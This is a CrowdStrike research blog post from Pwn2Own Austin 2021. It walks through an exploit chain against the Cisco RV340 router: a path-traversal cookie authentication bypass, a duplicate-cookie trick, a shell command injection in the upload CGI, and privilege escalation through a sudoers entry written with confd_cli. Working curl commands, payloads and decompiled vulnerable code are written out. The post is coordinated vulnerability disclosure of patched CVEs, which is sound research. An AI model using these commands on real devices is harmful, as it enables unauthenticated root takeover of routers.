# How To Pwn2Own The Cisco RV340 Router | CrowdStrike

- **Source :** crowdstrike
- **URL :** https://www.crowdstrike.com/en-us/blog/how-to-pwn2own-the-cisco-rv340-router/
- **Date :** March 24, 2022

---

# A Tale of Two Cookies: How to Pwn2Own the Cisco RV340 Router

March 24, 2022

• [ Benjamin Grap - Hanno Heinrichs - Lukas Kupczyk](/en-us/blog/author.benjamin-grap---hanno-heinrichs---lukas-kupczyk/ "Posts by Benjamin Grap - Hanno Heinrichs - Lukas Kupczyk") • [Threat Hunting & Intel](/en-us/blog/category.counter-adversary-operations/ "Threat Hunting & Intel")


In August 2021, [ZDI announced Pwn2Own Austin 2021](https://www.zerodayinitiative.com/blog/2021/8/11/pwn2own-austin-2021-phones-printers-nas-and-more), a security contest focusing on phones, printers, NAS devices and smart speakers, among other things. The Pwn2Own contest encourages security researchers to demonstrate remote zero-day exploits against a list of specified devices. If successful, the researchers are rewarded with a cash prize, and the leveraged vulnerabilities are responsibly disclosed to the respective vendors so they can improve the security of their products.

After reviewing the list of devices, we decided to target the Cisco RV340 router and the Lexmark MC3224i printer, and we managed to identify several vulnerabilities in both of them. Fortunately, we were [luckier than last year](/en-us/blog/pwn2own-tale-of-a-bug-found-and-lost-again/) and were able to participate in the contest for the first time. By successfully exploiting both devices, we won $20,000 USD, which CrowdStrike donated to several charitable organizations chosen by our researchers.

In this blog post, we outline the vulnerabilities we discovered and used to compromise the Cisco RV340 router.

## Overview

Affected Products (not all vulnerabilities apply to all products — for more details, see the Cisco vendor advisory listed below)| Cisco RV160 VPN Routers Cisco RV160W Wireless-AC VPN Routers Cisco RV260 VPN Routers Cisco RV260P VPN Routers with PoE Cisco RV260W Wireless-AC VPN Routers Cisco RV340 Dual WAN Gigabit VPN Routers Cisco RV340W Dual WAN Gigabit Cisco Wireless-AC VPN Routers Cisco RV345 Dual WAN Gigabit VPN Routers Cisco RV345P Dual WAN Gigabit POE VPN Routers  
---|---  
Affected Firmware Versions (without claim for completeness)| RV160 and RV260 Series Routers: 1.0.01.05 and earlier RV340 and RV345 Series Routers: 1.0.03.24 and earlier  
Fixed Firmware Version| RV160 and RV260 Series Routers: 1.0.01.07 RV340 and RV345 Series Routers: 1.0.03.26  
CVE| CVE-2022-20701 (LPE) CVE-2022-20705 (Authentication Bypass) CVE-2022-20707 (Command Injection)  
Root Causes| [CWE-77](https://cwe.mitre.org/data/definitions/77.html), [CWE-269](https://cwe.mitre.org/data/definitions/269.html), [CWE-285](https://cwe.mitre.org/data/definitions/285.html), [CWE-434](https://cwe.mitre.org/data/definitions/434.html), [CWE-754](https://cwe.mitre.org/data/definitions/754.html)  
Impact| Unauthenticated Remote Code Execution (RCE) as **root**  
Researchers| Benjamin Grap, Hanno Heinrichs, Lukas Kupczyk  
Cisco Resources| <https://tools.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-smb-mult-vuln-KA9PK6D>  
  
## Getting Started

To start our analysis of the Cisco RV340 router, we bought a device online and had it delivered. In parallel, we started to look at the router firmware, which is easily available online through the official Cisco website. When we started our analysis, the latest version of the firmware was v1.0.03.22. Shortly before the Pwn2Own contest, Cisco released a slightly modified version (v1.0.3.23), but this did not impact the research.

After downloading the firmware image, we used the Linux `file` command to try to determine the file type:
    
    
    $ file RV34X-v1.0.03.22-2021-06-14-02-33-28-AM.img 
    RV34X-v1.0.03.22-2021-06-14-02-33-28-AM.img: u-boot legacy uImage, RV340 Firmware Package, Linux/ARM, Firmware Image (gzip), 74777418 bytes, Sun Jun 13 21:03:33 2021, Load Address: 00000000, Entry Point: 00000000, Header CRC: 0XA2BA8A, Data CRC: 0XFFE70AEC
    

The tool’s output reveals that the firmware image is in the format of a [“Das U-Boot”](https://source.denx.de/u-boot/u-boot) image file — a common image format for Internet of Things (IoT) devices — that includes a boot loader and all of the necessary files that a system needs to operate. The architecture of the system is reported to be Linux/ARM, indicating that the image contains a Linux kernel (and typically also some user space programs) compiled for the ARM CPU architecture. Unpacking the image reveals a Linux root file system that contains all of the relevant binaries and configuration files of the firmware. Tools such as `[dumpimage](https://github.com/u-boot/u-boot/blob/master/tools/dumpimage.c)` (included in the U-Boot source code repository) or the firmware analysis program `[binwalk](https://github.com/ReFirmLabs/binwalk)` make the extraction very easy.

## Attacking the Web UI

Once we had the target device set up in our lab environment, it was clear the primary mechanism to configure and interact with the device is the web UI. By default, this web UI is reachable on the LAN interface of the device via HTTPS. Moreover, the web UI is also reachable on the WAN interface if remote management is enabled in the configuration. Therefore, looking for potential vulnerabilities in the web UI was a reasonable starting point for our analysis.

## Authentication Bypass

The web UI is served using the open-source web server [nginx](https://www.nginx.com). The web server directly serves the static web content and passes most of the functionality of the web UI via the uwsgi CGI interface to a number of CGI binaries. The configuration of the web server is located in the default location `/etc/nginx` in the firmware root partition. All CGI binaries are located in the directory `/www/cgi-bin/` on the root partition. The web UI uses the binaries `blockpage.cgi`, `jsonrpc.cgi` and `upload.cgi` to implement most of its functionality. The binary `blockpage.cgi` is used when serving the URL endpoint `/blockpage.php`. The binary `upload.cgi` is responsible for all requests made to URLs under the `/upload` path. 

The rest of the functionality and API functions of the web UI are served through `jsonrpc.cgi`, which acts as a translation and conversion middleware between the web UI and the CISCO `confd` service that implements most of the router’s functionality and abstractions.

Since any user input and data that passes into the system is first handled by the web server, we started to analyze the configuration files of the web server. This yielded the first potential vulnerability:
    
    
    $ cat conf.d/web.upload.conf 
    location /form-file-upload {
    	include uwsgi_params;
    	proxy_buffering off;
    	uwsgi_modifier1 9;
    	uwsgi_pass 127.0.0.1:9003;
    	uwsgi_read_timeout 3600;
    	uwsgi_send_timeout 3600;
    }
    
    location /upload {
    	set $deny 1;
    
            if (-f /tmp/websession/token/$cookie_sessionid) {
                    set $deny "0";
            }
    
            if ($deny = "1") {
                    return 403;
            }
    
    	upload_pass /form-file-upload;
    	upload_store /tmp/upload;
    	upload_store_access user:rw group:rw all:rw;
    	upload_set_form_field $upload_field_name.name "$upload_file_name";
    	upload_set_form_field $upload_field_name.content_type "$upload_content_type";
    	upload_set_form_field $upload_field_name.path "$upload_tmp_path";
    	upload_aggregate_form_field "$upload_field_name.md5" "$upload_file_md5";
    	upload_aggregate_form_field "$upload_field_name.size" "$upload_file_size";
    	upload_pass_form_field "^.*$";
    	upload_cleanup 400 404 499 500-505;
    	upload_resumable on;
    }
    

As shown in this excerpt of the nginx config `web.upload.conf`, the variable `$deny` is set to `0` when a session ID file exists in the specified file system location, `/tmp/websession/token/`. The idea is to ensure that only authenticated requests (using an existing session ID of an authenticated user) are permitted to the `/upload` URL endpoint. Any non-authenticated request is expected to be denied with an HTTP 403 error. However, this test can be bypassed — allowing access to the `/upload` URL path without prior authentication — by setting a `sessionid` cookie that references any existing file by using ../ to traverse the file system. This can be demonstrated with the two following `curl` commands:
    
    
    $ curl -k -X POST --cookie 'sessionid=../../../etc/doesntexist' 
    https://192.168.1.1/upload/
    <html>
    <head><title>403 Forbidden</title></head>
    <body bgcolor="white">
    <center><h1>403 Forbidden</h1></center>
    <hr><center>nginx</center>
    </body>
    </html>
    
    $ curl -k -X POST --cookie ’sessionid=../../../etc/passwd’ 
    https://192.168.1.1/upload/
    <html>
    <head><title>400 Bad Request</title></head>
    <body bgcolor="white">
    <center><h1>400 Bad Request</h1></center>
    <hr><center>nginx</center>
    </body>
    </html>
    

In the case of the second command, the server replies with a `400 Bad Request` status instead of the previously reported `403 Forbidden`, indicating the request was successfully passed to the upload CGI binary, bypassing the authentication check.

### Cookie Confusion

While communication with the binary was possible at this point, we realized additional checks of the cookie were happening inside the `upload.cgi` binary. We therefore decided to further analyze the CGI binary using the [Ghidra Reverse Engineering Framework](https://github.com/NationalSecurityAgency/ghidra). Using the integrated decompiler, we found that the binary extracts the `sessionid` cookie in a manner similar to the following C code:
    
    
    <...>
    cookie = getenv("HTTP_COOKIE");
    <...>
    if ( cookie )
    {
    StrBufSetStr(cookie_strbuf, cookie);
    cookie = 0;
    cookie_strbuf_cstring = (char *)StrBufToStr(cookie_strbuf);
    for ( i = strtok_r(cookie_strbuf_cstring, ";", &save_ptr); i;
    i = strtok_r(0, ";", &save_ptr) )
    {
    token = strstr(i, "sessionid=");
    if ( token )
    cookie = token + 10;
    }
    }
    <...>
    

The extracted session ID value, pointed to by the cookie variable, is later checked against a regular expression to validate that the cookie value contains only characters matching a Base64-encoded value. The relevant decompiled code looks like the following:
    
    
    <...>
    else if ( !strcmp(url_path, "/upload")
    && cookie
    && strlen(cookie) - 16 <= 64
    && !match_regex("^*$", cookie) )
    <...>
    handle_upload(
    cookie,
    json_destination_,
    json_option_,
    json_pathparam_,
    json_file_name_1,
    json_cert_name,
    json_cert_type,
    json_password);
    <...>
    

Therefore, further processing of our input is only performed if the cookie value passes this regular expression match.

However, this check conflicts with the previously shown authentication bypass that requires the characters “.” and “/”, which are not included in the checked alphabet. However, due to

repetitive calls of `strstr()` and `strtok_r()` in a loop by the cookie-parsing logic of the CGI binary, it will use the last parsed value in case multiple `sessionid` cookie values are specified. Therefore, it is possible to bypass both the nginx authentication check and the regular expression check by specifying two `sessionid` cookies with different values. The first cookie will be interpreted by the nginx web server and bypass the authentication check, while the second cookie with a matching Base64-encoded payload encoding a dummy session will be used by the “upload” CGI binary and will match the regular expression.

## Shell Command Injection

The web server is configured to use the [nginx upload module](https://www.nginx.com/resources/wiki/modules/upload.html), which receives and caches file uploads and then modifies the parameters received in `x-www-form-urlencoded` format before passing them on to the CGI binary. The `upload` CGI binary therefore receives a set of slightly modified parameters instead of those posted to the /upload URL. Most notably, the CGI binary receives an encoded `file.path` parameter that contains the local temporary filename of the uploaded file instead of the file content that was posted.

The upload CGI binary performs a number of checks to ensure the uploaded file exists before moving it to a different location and processing it. While some of these initial steps looked interesting at first glance, they were ultimately not exploitable; however, they proved to set a number of preconditions that needed to be met in order for the code flow to continue to the function that was ultimately exploitable.

Most of these checks are done in a function we named `move_file()`. It is called with three parameters that are passed from parameters supplied via the HTTP POST request. The context of the call of that function is shown in the pseudo code below:
    
    
    <...>
    check = move_file(post_pathparam, post_file_path, post_pathparam_filename);
    if (check == 0) {
    <...>
    if ( !strcmp(url_path, "/upload")
    && cookie
    && strlen(cookie) - 16 <= 64
    && !match_regex("^*$", cookie) ){
    <...>
    handle_upload(
    cookie,
    json_destination_,
    json_option_,
    json_pathparam_,
    json_file_name_1,
    json_cert_name,
    json_cert_type,
    json_password);
    <...>
    }
    }
    <...>
    

The function `move_file()` as shown below sets the destination path of the file depending on the HTTP POST parameter `pathparam` (represented by the variable `post_pathparam`). If it is none of the fixed values (e.g., `Firmware`, `Configuration`), the function returns `-1` and the “upload” CGI binary exits with an error message. Otherwise, the function calls a library function `is_file_exist()` for the HTTP POST parameter `file.path` to validate that that path exists.

This parameter is normally only set by the nginx upload module when it passes control to the upload CGI, but it can also be passed by the HTTP client, in which case the upload module will not change it. Next, it is checked that the `filename` and `pathparam` HTTP POST parameters do not contain anything but alphanumeric characters or the special characters “_”,”.” , and “-”. This is done to prevent command injections in the subsequent `system()` call to the Linux command line tool `mv`.
    
    
    int move_file(char *post_pathparam, char *post_file_path, char *post_pathparam_filename) {
    <...>
    if (tmp_destination && post_pathparam ) {
    if(!strcmp(post_pathparam,"Firmware") {
          		pb_tmp_path = "/tmp/firmware";
    		if(!strcmp(post_pathparam,”Configuration”) {
    	pb_tmp_path = "/tmp/configuration";
    		}
    		<...>
        	}
    
    	if(!is_file_exist(post_file_path)){
    		return -2;
    }
    if(strlen(post_file_path) > 120 ||
       strlen(post_pathparam_filename) > 120) {
    		return -3;
    }
    if(!match_regex("^*$",post_pathparam_filename)){
    	return -4;
    }
    sprintf(cmd,"mv -f %s %s/%s",
    post_file_path,
    pb_tmp_path,
    post_pathparam_filename);
        <...>
    if (cmd){
    exit_code = system(cmd);
    <...>
    return exitcode;
    }
    return -1;
    }
    

For processing to continue, the file identified by the `file.path` HTTP POST parameter must also be successfully moved by the `mv` command executed via `system()`, since the exit code of `mv` is only `0` if the file was successfully moved. Therefore, the file needs to be owned by the web server user `www-data`. However, the command will copy a file and then fail to remove the source file if it is readable by the user, but not writable, and the attempted move crosses a filesystem boundary. It is therefore possible to ensure the existence of a file in a known location by calling the “upload” CGI with prepared parameters:
    
    
    $ curl -k -X POST \
    --cookie "sessionid=../../../etc/passwd;"\
    "sessionid=Y2lzY28vMTI3LjAuMC4xLzEx;"
    --data "sessionid=foobar"\
    "&pathparam=Firmware"\
    "&fileparam=file001"\
    "&file.path=/proc/self/env"\
    "&destination=x&option=x" https://192.168.1.1/upload/
    

This will create a file `/tmp/firmware/file001` that we know exists for a subsequent call to the “upload” CGI, allowing us to successfully complete the call to `move_file()` and reach the `handle_upload()` function. Depending on the `pathparam `parameter, this function will read several different parameters that are then used to create a JSON object:
    
    
    <...>
    else if ( !strcmp(json_pathparam, "Firmware") )
    {
    json_object = (void *)make_firmware_json_object(json_destination,
    json_file_name,
    json_option);
    }
    <...>
    

Afterward, a stringified version of that JSON object (`json_obj_str`) is inserted into a single-quoted environment that specifies the HTTP POST data for a `curl` command, which is later passed to a `popen()` call:
    
    
    <...>
    sprintf(
    cmd_buf,
    "curl %s --cookie ’sessionid=%s' -X POST -H "
    "'Content-Type: application/json' -d '%s'",
    jsonrpc_url,
    cookie,
    json_obj_str);
    <...>
    exitcode = popen(cmd_buf, "r");
    <...>
    

This means the HTTP POST parameters `destination` and `option` are vulnerable to command injection by inserting a single quote (') inside these user-controlled JSON string values. By specifying the single quote, it is possible to escape the single-quote environment of the `curl` command and inject additional shell commands. A second HTTP POST request with `curl` such as the following will result in command injection:
    
    
    $ curl -k -X POST \
    --cookie "sessionid=../../../etc/passwd;"\
    "sessionid=Y2lzY28vMTI3LjAuMC4xLzEx;"
    --data "sessionid=foobar"\
    "&pathparam=Firmware"\
    "&fileparam=file001"\
    "&file.path=/tmp/firmware/file001"\
    "&destination=';id;&option=x" https://192.168.1.1/upload/
    
    <...>
    uid=33(www-data) gid=33(www-data) groups=33(www-data)
    

## Privilege Escalation

At this point, we are able to run arbitrary commands on the router without authentication. We are now able to create a session on the device and then log in to the web front end as an administrator, essentially giving us full control over the device’s functionality. However, the rules of Pwn2Own require participants to gain full access to the device, which means gaining `root` level privileges to the device’s operating system.

While the web server and CGI binaries that implement most of the functionality do not run with `root` privileges themselves, they are still able to execute privileged system operations, primarily through the Cisco `confd` that is running with `root` privileges. The web UI communicates with the confd server via a locally bound socket and sometimes even via the locally bound `restconf` API that it provides. It is also possible to communicate with `confd` and issue commands using the userspace application `confd_cli`. During our research, we noticed that the confd daemon provides commands to read and write files with the `file show` and `append` commands.

The following example shows how the `www-data` user can be added to the `sudoers`

file, leading to privilege escalation:
    
    
    $ echo 'www-data ALL=(ALL) NOPASSWD: ALL' > /tmp/www-data-sudo
    $ /usr/bin/confd_cli -U 0 -G 0 -u root -g root
    root connected from 127.0.0.1 using console on cisco-router91D57F
    root@cisco-router91D57F> file show /tmp/www-data-sudo | append /etc/sudoers
    file show /tmp/www-data-sudo | append /etc/sudoers
    <2021-10-11 09:43:01>
    root@router91D57F> exit
    exit
    $ sudo /bin/sh
    sudo /bin/sh
    BusyBox v1.23.2 (2021-06-14 02:21:16 IST) built-in shell (ash)
    # id
    id
    uid=0(root) gid=0(root) groups=0(root)
    

By running the `sudo` command, it is now possible to easily run programs with `root` privileges after running the exploit once. The `sudoers` entry remains persistent while the device is running. The last thing that remained to be done for the contest was to create an exploit script that exploits all of these vulnerabilities in sequence to yield a root shell on the device.

## Summary

In this blog, we described a number of vulnerabilities that can be exploited from the local network to bypass authentication, execute arbitrary shell commands and elevate privileges on a Cisco RV340 device. The research started as an experiment after the announcement of the Pwn2Own Austin 2021. The team enjoyed the challenge, as well as participating in Pwn2Own for the first time, and we welcome your feedback.

#### Additional Resources

  * _To learn how to incorporate intelligence on dangerous threat actors into your security strategy, visit the[ CrowdStrike CROWDSTRIKE FALCON® INTELLIGENCE™ product page](/en-us/endpoint-security-products/falcon-x-threat-intelligence/)._
  * _Request a free[ CrowdStrike Intelligence threat briefing](https://go.crowdstrike.com/threat-intelligence-briefing.html?utm_campaign=threatintelligence&utm_content=us&utm_medium=sem&utm_source=goog&utm_term=cyber%20threat%20intelligence&_bt=465670942471&_bk=cyber%20threat%20intelligence&_bm=e&_bn=g&_bg=108022039334&gclid=EAIaIQobChMIqsSdwZ-j7AIV9R6tBh23rQErEAAYASAAEgKc8fD_BwE&_ga=2.145914102.359113952.1606756854-1198667695.1606243810) and learn how to stop adversaries targeting your organization._
  * _Learn more about the[ CrowdStrike Falcon® platform by visiting the product webpage.](/en-us/endpoint-security-products/falcon-platform/)_
  * _[Get a full-featured free trial of CrowdStrike Falcon® Prevent™](https://go.crowdstrike.com/try-falcon-prevent.html) to see for yourself how true next-gen AV performs against today’s most sophisticated threats._



[ ](https://www.linkedin.com/shareArticle) [ ](https://twitter.com/share)

* * *

#### Related Content

[ ![CrowdStrike Named a Leader in The Forrester Wave™: External Threat Intelligence Service Providers, Q3 2026](https://assets.crowdstrike.com/is/image/crowdstrikeinc/Forrester%20Wave%20Threat%20Intel%202026-2-1060x698_Blog?wid=1060&hei=698&fmt=png-alpha&qlt=95,0&resMode=sharp2&op_usm=3.0,0.3,2,0) Threat Hunting & Intel | Sep 17, 2026  CrowdStrike Named a Leader in The Forrester Wave™: External Threat Intelligence Service Providers, Q3 2026 ](/en-us/blog/crowdstrike-named-leader-forrester-wave-external-threat-intelligence-q3-2026/) [ ![PhantomRaven: An LLM-Generated Information Stealer Developed for Bug Bounty Hunting](https://assets.crowdstrike.com/is/image/crowdstrikeinc/Blog-InfoStealer?wid=2048&hei=1349&fmt=png-alpha&qlt=95,0&resMode=sharp2&op_usm=3.0,0.3,2,0) Threat Hunting & Intel | Sep 15, 2026  PhantomRaven: An LLM-Generated Information Stealer Developed for Bug Bounty Hunting ](/en-us/blog/phantomraven-llm-generated-information-stealer-for-bug-bounty-hunting/) [ ![Peer Pressure: Inside the Sality Botnet Disruption Operation](https://assets.crowdstrike.com/is/image/crowdstrikeinc/Blog-FalCon-Sality?wid=1060&hei=698&fmt=png-alpha&qlt=95,0&resMode=sharp2&op_usm=3.0,0.3,2,0) Threat Hunting & Intel | Sep 01, 2026  Peer Pressure: Inside the Sality Botnet Disruption Operation ](/en-us/blog/inside-sality-botnet-disruption-operation/)